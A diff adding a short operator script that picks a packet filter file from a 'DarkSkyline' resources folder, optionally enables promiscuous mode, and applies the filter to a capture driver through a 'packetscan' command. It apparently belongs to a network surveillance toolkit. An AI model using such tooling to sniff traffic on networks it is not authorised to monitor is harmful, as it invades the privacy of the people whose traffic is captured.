@@ -1,0 +1,92 @@
+#--------------------------------------------------------
+# File: SetFilter.eps
+#
+# Wrapper script to change the packet filter
+#
+# Modifications:
+#  12/03/2002	Created.
+#--------------------------------------------------------
+
+@echo off;
+
+if ($argc != 2) {
+    echo "Usage: $argv[0] <driverName>";
+    return false;
+}
+
+string $driver = $argv[1];
+string $choice;
+
+# get the filters directory
+@record on;
+# get resource directory
+if (`getdirectory -resources`) {
+    string $resDir = GetCmdData("dir");
+    if (defined($resDir[0])) {
+	string $resPath = "$resDir\\DarkSkyline";
+
+	string $filters;
+	if (`local dir *.filt -path "$resPath\\Filters" -max 0`) {
+	    string $filters = GetCmdData("name");
+	    int $size = sizeof($filters);
+
+	    bool $valid = false;
+	    while ($valid == false) {
+	        int $i=0;
+		int $index = 1;
+	        echo "(0). Select File manually";
+		while ($i < $size) {
+		    echo "($index). $filters[$i]";
+		    $index++;
+		    $i++;
+		}
+
+		int $value = GetInput("Choose Filter");
+		if ($value == 0) {
+		    # user wants to pick file manually
+		    $valid = true;
+		} else if ($value <= $size) {
+		    $value--;
+		    $choice = "$resPath\\Filters\\$filters[$value]";
+		    $valid = true;
+		} else {
+		    echo "*** Invalid Choice ***";
+		}
+	    }
+	}
+    }
+}
+@record off;
+
+# get the local filter
+ifnot (defined($choice[0])) {
+    $choice = GetInput("Enter the filter file");
+    ifnot (defined($choice[0])) {
+	echo "* Invalid file";
+	return false;
+    }
+}
+
+echo "";
+echo "Filter : ";
+echo "    $choice";
+echo "";
+
+echo "***************** QUESTION CHANGED *****************";
+echo "******* Answer should almost always be YES *********";
+echo "****************************************************";
+string $promiscuous = "";
+ifnot (prompt "Do you want to listen without promiscuous mode?") {
+    if (prompt "Are you SURE you want to enable promiscuous mode?") {
+        $promiscuous = "-promiscuous";
+    }
+}
+echo $promiscuous;
+
+ifnot (prompt "Continue?") {
+    return false;
+}
+
+# change the filter
+echo "Changing data in registry";
+return `packetscan -name $driver -set "$choice" $promiscuous`;
